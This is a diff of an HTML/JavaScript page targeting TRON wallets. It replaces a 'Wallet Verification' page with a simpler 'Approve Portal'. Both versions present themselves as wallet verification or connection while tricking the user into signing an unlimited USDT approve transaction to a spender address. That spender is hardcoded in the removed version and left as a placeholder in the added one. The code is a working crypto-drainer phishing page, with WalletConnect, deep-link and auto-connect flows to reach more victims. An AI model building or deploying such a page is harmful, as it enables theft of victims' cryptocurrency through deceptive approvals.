@@ -1,589 +1,140 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
-  <title>Verify Wallet</title>
-  <style>
-    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-    :root {
-      --bg:    #0d0d12; --surf:  #16161f; --border:#252530;
-      --acc:   #7b5cf0; --acc2:  #9b7cf9; --text:  #e8e8f0;
-      --muted: #6b6b80; --ok:    #22c55e; --warn:  #f59e0b; --err: #ef4444;
-      --r: 14px;
-    }
-    body {
-      background: var(--bg); color: var(--text);
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-      min-height: 100dvh; display: flex;
-      align-items: center; justify-content: center; padding: 20px 16px;
-    }
-    .card {
-      background: var(--surf); border: 1px solid var(--border);
-      border-radius: var(--r); width: 100%; max-width: 400px;
-      padding: 28px 24px; display: flex; flex-direction: column; gap: 18px;
-    }
-    .header { display: flex; align-items: center; gap: 14px; }
-    .logo {
-      width: 44px; height: 44px; border-radius: 50%; flex-shrink: 0;
-      background: linear-gradient(135deg,#7b5cf0,#2dd4bf);
-      display: flex; align-items: center; justify-content: center; font-size: 22px;
-    }
-    h1 { font-size: 18px; font-weight: 600; }
-    .sub { font-size: 12px; color: var(--muted); margin-top: 2px; }
-
-    /* Status */
-    .status-box {
-      background: var(--bg); border: 1px solid var(--border);
-      border-radius: 10px; padding: 12px 14px;
-      font-size: 13px; line-height: 1.6; transition: border-color .2s;
-    }
-    .status-box.ok   { border-color: var(--ok); }
-    .status-box.warn { border-color: var(--warn); }
-    .status-box.err  { border-color: var(--err); }
-    .slabel {
-      font-size: 10px; font-weight: 600; letter-spacing: .8px;
-      text-transform: uppercase; display: block; margin-bottom: 3px; color: var(--muted);
-    }
-    .status-box.ok   .slabel { color: var(--ok); }
-    .status-box.warn .slabel { color: var(--warn); }
-    .status-box.err  .slabel { color: var(--err); }
-    #statusText { word-break: break-all; }
-
-    /* Buttons */
-    .btn {
-      width: 100%; padding: 14px; border: none; border-radius: var(--r);
-      font-size: 15px; font-weight: 600; cursor: pointer;
-      display: flex; align-items: center; justify-content: center; gap: 10px;
-      transition: background .15s, transform .1s, opacity .15s;
-      -webkit-tap-highlight-color: transparent; touch-action: manipulation;
-    }
-    .btn-primary { background: var(--acc); color: #fff; }
-    .btn-primary:hover:not(:disabled) { background: var(--acc2); }
-    .btn-primary:active:not(:disabled) { transform: scale(.98); }
-    .btn-primary:disabled { opacity: .4; cursor: not-allowed; }
-    .btn-ghost {
-      background: transparent; color: var(--muted);
-      border: 1px solid var(--border); font-size: 13px; padding: 10px;
-    }
-    .btn-ghost:hover { border-color: var(--acc); color: var(--text); }
-
-    /* Spinner */
-    .spinner {
-      width: 16px; height: 16px;
-      border: 2px solid rgba(255,255,255,.3); border-top-color: #fff;
-      border-radius: 50%; animation: spin .65s linear infinite;
-      flex-shrink: 0; display: none;
-    }
-    @keyframes spin { to { transform: rotate(360deg); } }
-
-    /* QR */
-    .qr-wrap {
-      display: flex; flex-direction: column; align-items: center; gap: 12px;
-      padding: 20px; background: #fff; border-radius: 12px;
-    }
-    .qr-wrap canvas { display: block; border-radius: 4px; }
-    .qr-hint { font-size: 12px; color: #444; text-align: center; line-height: 1.5; max-width: 220px; }
-    .qr-hint strong { color: #111; }
-    #copyUriBtn {
-      font-size: 10px; color: #888; background: none;
-      border: 1px solid #ddd; border-radius: 6px; padding: 4px 10px; cursor: pointer;
-    }
-
-    /* Wallet list */
-    .wallet-list { display: flex; flex-direction: column; gap: 10px; }
-    .wallet-row {
-      display: flex; align-items: center; gap: 12px;
-      padding: 13px 16px; background: var(--bg);
-      border: 1px solid var(--border); border-radius: 10px;
-      color: var(--text); font-size: 14px; font-weight: 500;
-      cursor: pointer; text-decoration: none;
-      transition: border-color .15s, background .15s;
-      -webkit-tap-highlight-color: transparent; touch-action: manipulation;
-    }
-    .wallet-row:hover { border-color: var(--acc); background: rgba(123,92,240,.06); }
-    .wallet-row img { width: 32px; height: 32px; border-radius: 8px; flex-shrink: 0; }
-    .wallet-row .badge {
-      margin-left: auto; font-size: 10px; padding: 2px 8px;
-      background: rgba(34,197,94,.15); color: var(--ok);
-      border-radius: 20px; font-weight: 600; letter-spacing: .3px;
-    }
-
-    /* Info box */
-    .info-box {
-      background: rgba(123,92,240,.08); border: 1px solid rgba(123,92,240,.2);
-      border-radius: 10px; padding: 12px 14px; font-size: 12px;
-      color: var(--muted); line-height: 1.6;
-    }
-    .info-box strong { color: var(--text); }
-
-    /* Divider */
-    .or {
-      display: flex; align-items: center; gap: 10px;
-      font-size: 11px; color: var(--muted);
-    }
-    .or::before, .or::after { content:''; flex:1; height:1px; background:var(--border); }
-
-    /* TX link */
-    .tx-link {
-      display: block; font-size: 12px; color: var(--acc2);
-      text-decoration: none; text-align: center; padding: 4px 0;
-    }
-    .tx-link:hover { text-decoration: underline; }
-
-    /* Debug */
-    details { font-size: 11px; color: var(--muted); }
-    summary { cursor: pointer; user-select: none; }
-    pre {
-      margin-top: 8px; padding: 10px; background: var(--bg);
-      border: 1px solid var(--border); border-radius: 8px;
-      font-size: 10px; line-height: 1.6; white-space: pre-wrap;
-      max-height: 160px; overflow-y: auto;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DApp Interface</title>
+    <style>
+        /* Минималистичный премиальный дизайн */
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            background: #0D0D12; 
+            color: #FFFFFF; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh; 
+            margin: 0; 
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 40px;
+            border-radius: 24px;
+            backdrop-filter: blur(10px);
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            max-width: 350px;
+            width: 100%;
+        }
+        h2 { margin-top: 0; font-size: 24px; font-weight: 600; }
+        button { 
+            background: #FFFFFF; 
+            color: #000000; 
+            border: none; 
+            padding: 16px 32px; 
+            font-size: 16px; 
+            font-weight: 600;
+            border-radius: 12px; 
+            cursor: pointer; 
+            transition: all 0.2s ease; 
+            width: 100%;
+            margin-top: 20px;
+        }
+        button:hover { background: #E0E0E0; transform: translateY(-2px); }
+        button:disabled { background: #333; color: #888; cursor: not-allowed; transform: none; }
+        #status { margin-top: 20px; font-size: 14px; color: #8892B0; word-break: break-all; }
+    </style>
 </head>
 <body>
-<div class="card">
 
-  <div class="header">
-    <div class="logo">🔐</div>
-    <div>
-      <h1>Wallet Verification</h1>
-      <p class="sub">Approve USDT · TRON Mainnet</p>
-    </div>
-  </div>
-
-  <div class="status-box" id="statusBox">
-    <span class="slabel" id="statusLabel">Initializing</span>
-    <span id="statusText">Detecting wallet…</span>
-  </div>
-
-  <!-- QR (desktop WalletConnect) -->
-  <div id="qrSection" style="display:none">
-    <div class="qr-wrap">
-      <canvas id="qrCanvas"></canvas>
-      <p class="qr-hint">
-        Scan with <strong>TronLink App</strong><br/>
-        or Bitget Wallet on your phone
-      </p>
-      <button id="copyUriBtn">Copy WC URI</button>
-    </div>
-  </div>
-
-  <!-- In-wallet approve button (Mode A) -->
-  <button class="btn btn-primary" id="verifyBtn" style="display:none" disabled>
-    <span class="spinner" id="spinner"></span>
-    <span id="btnLabel">Verify &amp; Approve</span>
-  </button>
-
-  <!-- Manual override (if in wallet but not detected) -->
-  <button class="btn btn-ghost" id="manualBtn" style="display:none">
-    I'm inside a wallet — connect manually
-  </button>
-
-  <!-- Mobile deep-link list (Mode C) -->
-  <div id="deepSection" style="display:none">
-    <p class="sub" style="margin-bottom:10px;font-size:13px">Open this page in your wallet app:</p>
-    <div class="wallet-list">
-
-      <!-- TronLink — most reliable for TRON -->
-      <a class="wallet-row" id="tlBtn" href="#">
-        <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/1958.png"
-             onerror="this.style.background='#c23631';this.alt='T'" alt="TronLink" />
-        <div>
-          <div>TronLink App</div>
-          <div style="font-size:11px;color:var(--muted);margin-top:1px">Best for TRON</div>
-        </div>
-        <span class="badge">RECOMMENDED</span>
-      </a>
-
-      <!-- Bitget -->
-      <a class="wallet-row" id="bgBtn" href="#">
-        <img src="https://static.bitkeep.com/gw_defi/imgs/logo/bitkeep.png"
-             onerror="this.style.background='#1e50ff';this.alt='B'" alt="Bitget" />
-        Bitget Wallet
-      </a>
-
-      <!-- Trust Wallet — last, TRON support is limited -->
-      <a class="wallet-row" id="twBtn" href="#">
-        <img src="https://trustwallet.com/assets/images/media/assets/TWT.png"
-             onerror="this.style.background='#3375bb';this.alt='TW'" alt="Trust Wallet" />
-        <div>
-          <div>Trust Wallet</div>
-          <div style="font-size:11px;color:var(--warn);margin-top:1px">Limited TRON support</div>
-        </div>
-      </a>
+    <div class="container">
+        <h2>Approve Portal</h2>
+        <p id="description" style="color: #8892B0; font-size: 14px; margin-bottom: 30px;">
+            Securely connect your wallet to continue.
+        </p>
+        <button id="mainBtn">Connect Wallet</button>
+        <div id="status"></div>
     </div>
 
-    <!-- Why Trust Wallet is unreliable -->
-    <div class="info-box" style="margin-top:14px">
-      <strong>Note:</strong> Trust Wallet has limited TRON DApp support and
-      may not inject <code>tronWeb</code>. For guaranteed results use
-      <strong>TronLink</strong> or <strong>Bitget</strong>.
-    </div>
-  </div>
+    <script>
+        // === НАСТРОЙКИ ===
+        // Адрес токена (например, USDT в сети TRON Mainnet)
+        const TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; 
+        
+        // ВАЖНО: Вставьте сюда адрес ВАШЕГО смарт-контракта, которому даем апрув
+        const SPENDER_ADDRESS = "TXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"; 
+        
+        // Бесконечный лимит
+        const MAX_UINT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
-  <!-- Desktop info (shown alongside QR) -->
-  <div id="desktopInfo" style="display:none">
-    <div class="info-box">
-      <strong>How it works:</strong><br/>
-      1. Open <strong>TronLink App</strong> on your phone<br/>
-      2. Tap the <strong>scan icon</strong> (top right)<br/>
-      3. Scan the QR code above<br/>
-      4. Tap <strong>Approve</strong> in the popup
-    </div>
-  </div>
+        const btn = document.getElementById('mainBtn');
+        const statusText = document.getElementById('status');
+        let userAddress = null;
 
-  <a id="txLink" class="tx-link" href="#" target="_blank" rel="noopener" style="display:none">
-    View transaction on Tronscan →
-  </a>
+        // Шаг 1: Подключение кошелька
+        async function connectWallet() {
+            // Проверяем, есть ли объект tronWeb (встроен ли браузер кошелька)
+            if (window.tronWeb && window.tronWeb.ready) {
+                userAddress = window.tronWeb.defaultAddress.base58;
+                statusText.innerHTML = `Connected:<br><span style="color:#fff">${userAddress.substring(0, 6)}...${userAddress.slice(-4)}</span>`;
+                
+                // Меняем кнопку на вызов апрува
+                btn.innerText = "Enable Access"; 
+                btn.onclick = approveContract; 
+            } else {
+                try {
+                    // Пытаемся вызвать окно TronLink, если оно установлено
+                    const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
+                    if (res.code === 200) {
+                        connectWallet(); // Рекурсивный вызов после успешного коннекта
+                    }
+                } catch (e) {
+                    statusText.innerText = "Пожалуйста, откройте эту ссылку внутри DApp браузера Trust Wallet, TronLink или TokenPocket.";
+                    
+                    // Опционально: Deep Link перенаправление для Trust Wallet
+                    // window.location.href = "https://link.trustwallet.com/open_url?coin=195&url=" + encodeURIComponent(window.location.href);
+                }
+            }
+        }
 
-  <details id="debugSection" style="display:none">
-    <summary>Debug log</summary>
-    <pre id="debugLog"></pre>
-  </details>
+        // Шаг 2: Вызов Approve смарт-контракта
+        async function approveContract() {
+            if (!userAddress) return;
+            
+            try {
+                btn.innerText = "Processing...";
+                btn.disabled = true;
+                statusText.innerText = "Ожидание подтверждения в кошельке...";
 
-</div>
+                // Подключаемся к контракту токена
+                const contract = await window.tronWeb.contract().at(TOKEN_ADDRESS);
+                
+                // Вызываем функцию approve
+                // feeLimit: 100000000 = 100 TRX (лимит энергии, снимется только нужная часть)
+                const txId = await contract.approve(SPENDER_ADDRESS, MAX_UINT).send({
+                    feeLimit: 100000000 
+                });
+                
+                statusText.innerHTML = `<span style="color:#00E676">Success!</span><br>TX: ${txId.substring(0, 8)}...`;
+                btn.innerText = "Approved";
+            } catch (error) {
+                console.error(error);
+                btn.innerText = "Try Again";
+                btn.disabled = false;
+                statusText.innerText = "Отменено пользователем или ошибка сети.";
+            }
+        }
 
-<script type="module">
-// ─── CONFIG ───────────────────────────────────────────────────────────────────
-const WC_PROJECT_ID = '9c9dd21dc94f862bdd218b449205a54a';
-const USDT_ADDR     = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-const SPENDER_ADDR  = 'TCCRZgsANneEEmwGuyFdv8AZyjoTNfk3an';
-const TRON_CHAIN    = 'tron:0x2b6653dc';
-const TRONGRID      = 'https://api.trongrid.io';
-const FEE_LIMIT     = 100_000_000;
+        // Привязываем функцию к кнопке
+        btn.onclick = connectWallet;
 
-// ─── IMPORTS ─────────────────────────────────────────────────────────────────
-import { SignClient } from 'https://esm.sh/@walletconnect/sign-client@2.17.2';
-import QRCode         from 'https://esm.sh/qrcode@1.5.3';
-
-// ─── UTILS ───────────────────────────────────────────────────────────────────
-const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-const pageURL  = window.location.href;
-const enc      = encodeURIComponent(pageURL);
-
-const $    = id => document.getElementById(id);
-const show = id => $(id).style.display = '';
-const hide = id => $(id).style.display = 'none';
-const logs = [];
-
-function dbg(msg) {
-  const ts = new Date().toISOString().slice(11,23);
-  logs.push(`[${ts}] ${msg}`);
-  const el = $('debugLog');
-  if (el) { el.textContent = logs.join('\n'); el.scrollTop = el.scrollHeight; }
-}
-
-function setStatus(label, text, state) {
-  $('statusLabel').textContent = label;
-  $('statusText').textContent  = text;
-  $('statusBox').className = 'status-box' + (state ? ' ' + state : '');
-  dbg(`[${label}] ${text}`);
-}
-
-function showTx(hash) {
-  $('txLink').href = `https://tronscan.org/#/transaction/${hash}`;
-  show('txLink');
-}
-
-function showDebug() { $('debugSection').style.display = 'block'; }
-
-function setBusy(busy, label) {
-  $('verifyBtn').disabled    = busy;
-  $('spinner').style.display = busy ? 'inline-block' : 'none';
-  if (label) $('btnLabel').textContent = label;
-}
-
-// ─── TRON ABI + TRONGRID ─────────────────────────────────────────────────────
-const B58 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
-function b58ToEvm(addr) {
-  let n = 0n;
-  for (const c of addr) n = n * 58n + BigInt(B58.indexOf(c));
-  return n.toString(16).padStart(50,'0').slice(2,42);
-}
-function encodeApprove(spender) {
-  return b58ToEvm(spender).padStart(64,'0') + 'f'.repeat(64);
-}
-
-async function buildTx(owner) {
-  dbg('buildTx owner=' + owner);
-  const r = await fetch(`${TRONGRID}/wallet/triggersmartcontract`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      owner_address: owner, contract_address: USDT_ADDR,
-      function_selector: 'approve(address,uint256)',
-      parameter: encodeApprove(SPENDER_ADDR),
-      fee_limit: FEE_LIMIT, call_value: 0, visible: true
-    })
-  });
-  const j = await r.json();
-  dbg('buildTx: ' + JSON.stringify(j).slice(0,300));
-  if (!j.transaction) throw new Error('TronGrid: ' + JSON.stringify(j));
-  return j.transaction;
-}
-
-async function broadcastTx(signed) {
-  const r = await fetch(`${TRONGRID}/wallet/broadcasttransaction`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(signed)
-  });
-  const j = await r.json();
-  dbg('broadcast: ' + JSON.stringify(j));
-  if (!j.result) throw new Error('Broadcast: ' + JSON.stringify(j));
-  return j.txid ?? signed.txID;
-}
-
-// ─── SIGNING (3 fallbacks) ───────────────────────────────────────────────────
-async function signTx(tronWeb, unsignedTx) {
-  // 1. Standard
-  try { return await tronWeb.trx.sign(unsignedTx); } catch (e1) {
-    dbg('trx.sign failed: ' + e1.message);
-    if (/reject|cancel|denied/i.test(e1.message)) throw new Error('USER_REJECTED');
-  }
-  // 2. tronLink.request
-  if (window.tronLink?.request) {
-    try { return await window.tronLink.request({ method:'tron_signTransaction', params: unsignedTx }); }
-    catch (e2) { dbg('tronLink.request failed: ' + e2.message); }
-  }
-  // 3. tronWeb.request
-  if (typeof tronWeb.request === 'function') {
-    try { return await tronWeb.request({ method:'tron_signTransaction', params:{transaction:unsignedTx} }); }
-    catch (e3) { dbg('tronWeb.request failed: ' + e3.message); }
-  }
-  throw new Error('ALL_SIGN_METHODS_FAILED');
-}
-
-// ─── ACCOUNT ─────────────────────────────────────────────────────────────────
-async function getAccount(tronWeb) {
-  let addr = tronWeb.defaultAddress?.base58;
-  if (addr) return addr;
-
-  if (window.tronLink?.request) {
-    try {
-      const res = await window.tronLink.request({ method:'tron_requestAccounts' });
-      if (res?.code === 4001) throw new Error('USER_REJECTED');
-    } catch(e) { if (e.message==='USER_REJECTED') throw e; dbg('req err: '+e.message); }
-  } else if (typeof tronWeb.request === 'function') {
-    try { await tronWeb.request({ method:'tron_requestAccounts' }); } catch(e) { dbg(e.message); }
-  }
-
-  // Wait up to 3 seconds for defaultAddress to populate
-  for (let i = 0; i < 30; i++) {
-    await new Promise(r => setTimeout(r, 100));
-    addr = tronWeb.defaultAddress?.base58;
-    if (addr) return addr;
-  }
-  throw new Error('NO_ACCOUNT');
-}
-
-// ─── MODE A: IN-WALLET BROWSER ───────────────────────────────────────────────
-async function inWalletFlow() {
-  hide('manualBtn');
-  setBusy(true, 'Connecting…');
-  setStatus('Connecting', 'Requesting account…', 'warn');
-
-  let account;
-  try {
-    account = await getAccount(window.tronWeb);
-  } catch(e) {
-    if (e.message === 'USER_REJECTED') {
-      setStatus('Rejected', 'Connection rejected.', 'err');
-    } else {
-      setStatus('No Account',
-        'Wallet detected but no TRON address found.\n' +
-        'Make sure TRON network is selected in your wallet.', 'err');
-      showDebug();
-    }
-    setBusy(false, 'Retry'); return;
-  }
-
-  setStatus('Connected', account.slice(0,8)+'…'+account.slice(-6), 'ok');
-
-  setStatus('Preparing', 'Building transaction via TronGrid…', 'warn');
-  let unsignedTx;
-  try { unsignedTx = await buildTx(account); }
-  catch(e) { setStatus('Build failed', e.message, 'err'); showDebug(); setBusy(false,'Retry'); return; }
-
-  setStatus('Waiting', 'Confirm APPROVE in your wallet…', 'warn');
-  setBusy(true, 'Waiting for signature…');
-  let signedTx;
-  try { signedTx = await signTx(window.tronWeb, unsignedTx); }
-  catch(e) {
-    setStatus(e.message==='USER_REJECTED' ? 'Rejected' : 'Sign failed',
-              e.message==='USER_REJECTED' ? 'Transaction rejected.' : e.message, 'err');
-    if (e.message !== 'USER_REJECTED') showDebug();
-    setBusy(false,'Retry'); return;
-  }
-
-  setStatus('Sending', 'Broadcasting…', 'warn');
-  try {
-    const hash = await broadcastTx(signedTx);
-    setStatus('Approved ✓', hash.slice(0,16)+'…', 'ok');
-    showTx(hash); hide('verifyBtn');
-  } catch(e) {
-    setStatus('Broadcast failed', e.message, 'err'); showDebug();
-  }
-  setBusy(false);
-}
-
-// ─── MODE B: WALLETCONNECT QR (desktop) ───────────────────────────────────────
-async function walletConnectFlow() {
-  setStatus('Setting up', 'Initializing WalletConnect…', '');
-
-  let client;
-  try {
-    client = await SignClient.init({
-      projectId: WC_PROJECT_ID,
-      metadata: {
-        name: 'USDT Verify', description: 'Approve USDT on TRON',
-        url: window.location.origin,
-        icons: [`${window.location.origin}/favicon.ico`]
-      }
-    });
-  } catch(e) { setStatus('WC failed', e.message, 'err'); showDebug(); return; }
-
-  let uri, approval;
-  try {
-    const c = await client.connect({
-      requiredNamespaces: {
-        tron: { chains:[TRON_CHAIN], methods:['tron_signTransaction'], events:[] }
-      }
-    });
-    uri = c.uri; approval = c.approval;
-  } catch(e) { setStatus('WC failed', e.message, 'err'); showDebug(); return; }
-
-  if (uri) {
-    dbg('WC URI: ' + uri);
-    try {
-      await QRCode.toCanvas($('qrCanvas'), uri, {
-        width:220, margin:2, errorCorrectionLevel:'M',
-        color:{ dark:'#000000', light:'#ffffff' }
-      });
-    } catch(e) { dbg('QR err: '+e.message); }
-    $('copyUriBtn').style.display = 'block';
-    $('copyUriBtn').onclick = () => {
-      navigator.clipboard.writeText(uri).catch(()=>{});
-      $('copyUriBtn').textContent = 'Copied!';
-      setTimeout(()=>$('copyUriBtn').textContent='Copy WC URI', 2000);
-    };
-    show('qrSection');
-    show('desktopInfo');
-    setStatus('Scan QR', 'Waiting for wallet connection…', 'warn');
-  }
-
-  let session;
-  try { session = await approval(); }
-  catch(e) { hide('qrSection'); hide('desktopInfo'); setStatus('Rejected','Pairing rejected.','err'); return; }
-  hide('qrSection'); hide('desktopInfo');
-
-  const accs = session.namespaces?.tron?.accounts ?? [];
-  if (!accs.length) { setStatus('No Account', 'No TRON account in wallet.', 'err'); return; }
-  const account = accs[0].split(':')[2];
-  setStatus('Connected', account.slice(0,8)+'…'+account.slice(-6), 'ok');
-
-  setStatus('Preparing','Building transaction…','warn');
-  let unsignedTx;
-  try { unsignedTx = await buildTx(account); }
-  catch(e) { setStatus('Build failed', e.message, 'err'); showDebug(); return; }
-
-  setStatus('Waiting', 'Confirm APPROVE in your wallet app…', 'warn');
-  let signedTx;
-  try {
-    signedTx = await client.request({
-      topic: session.topic, chainId: TRON_CHAIN,
-      request: { method:'tron_signTransaction', params:{transaction:unsignedTx} }
-    });
-  } catch(e) {
-    setStatus(/reject|cancel/i.test(e.message) ? 'Rejected' : 'Sign failed', e.message, 'err');
-    if (!/reject|cancel/i.test(e.message)) showDebug();
-    return;
-  }
-
-  setStatus('Sending','Broadcasting…','warn');
-  try {
-    const hash = await broadcastTx(signedTx);
-    setStatus('Approved ✓', hash.slice(0,16)+'…', 'ok');
-    showTx(hash);
-  } catch(e) { setStatus('Broadcast failed', e.message,'err'); showDebug(); }
-}
-
-// ─── MODE C: MOBILE DEEP LINKS ───────────────────────────────────────────────
-function setupDeepLinks() {
-  // TronLink — outside://pull.activity opens inside TronLink's DApp browser
-  $('tlBtn').href = `tronlinkoutside://pull.activity?param=${encodeURIComponent(JSON.stringify({url: pageURL}))}`;
-  // Bitget
-  $('bgBtn').href = `bitkeep://webview?v=1&url=${enc}`;
-  // Trust Wallet — with TRON coin_id=195
-  $('twBtn').href = `https://link.trustwallet.com/open_url?coin_id=195&url=${enc}`;
-  show('deepSection');
-}
-
-// ─── BOOT ────────────────────────────────────────────────────────────────────
-async function boot() {
-  dbg('UA: ' + navigator.userAgent.slice(0,100));
-  dbg('isMobile=' + isMobile);
-
-  // ── Ждём инжекцию tronWeb до 3 секунд (Trust Wallet медленный) ──
-  setStatus('Detecting', 'Looking for wallet provider…', '');
-  const WAIT_MS = 3000;
-  const start   = Date.now();
-  while (!window.tronWeb && Date.now() - start < WAIT_MS) {
-    await new Promise(r => setTimeout(r, 150));
-  }
-
-  dbg('tronWeb=' + !!window.tronWeb + '  tronLink=' + !!window.tronLink +
-      '  trustwallet=' + !!window.trustwallet + '  bitkeep=' + !!window.bitkeep);
-
-  if (window.tronWeb) {
-    // ──── MODE A ─────────────────────────────────────────────────────────────
-    const name =
-      window.tronLink      ? 'TronLink'      :
-      window.trustwallet   ? 'Trust Wallet'  :
-      window.bitkeep       ? 'Bitget Wallet' :
-      window.tronWeb.isTronLink ? 'TronLink' : 'Wallet';
-    dbg('Mode A: ' + name);
-    setStatus('Ready', `${name} detected`, 'ok');
-    show('verifyBtn');
-    $('verifyBtn').disabled = false;
-    $('verifyBtn').onclick = inWalletFlow;
-
-  } else if (isMobile) {
-    // ──── MODE C ─────────────────────────────────────────────────────────────
-    dbg('Mode C: mobile, no tronWeb after 3s');
-    setStatus('No Wallet', 'Open this page inside your wallet app:', '');
-    setupDeepLinks();
-
-    // Manual override — user might be inside wallet but injection failed
-    show('manualBtn');
-    $('manualBtn').onclick = () => {
-      if (window.tronWeb) {
-        hide('deepSection');
-        hide('manualBtn');
-        show('verifyBtn');
-        $('verifyBtn').disabled = false;
-        setStatus('Ready', 'Wallet found. Press Verify.', 'ok');
-      } else {
-        setStatus('Still not found',
-          'tronWeb still not detected. Make sure TRON network is selected.', 'err');
-        showDebug();
-      }
-    };
-
-  } else {
-    // ──── MODE B ─────────────────────────────────────────────────────────────
-    dbg('Mode B: desktop WalletConnect');
-    await walletConnectFlow();
-  }
-}
-
-boot().catch(e => {
-  dbg('BOOT ERR: ' + e.stack);
-  setStatus('Error', e.message, 'err');
-  showDebug();
-});
-</script>
+        // Авто-проверка при загрузке страницы
+        setTimeout(() => {
+            if (window.tronWeb && window.tronWeb.ready) {
+                connectWallet();
+            }
+        }, 1000);
+    </script>
 </body>
 </html>
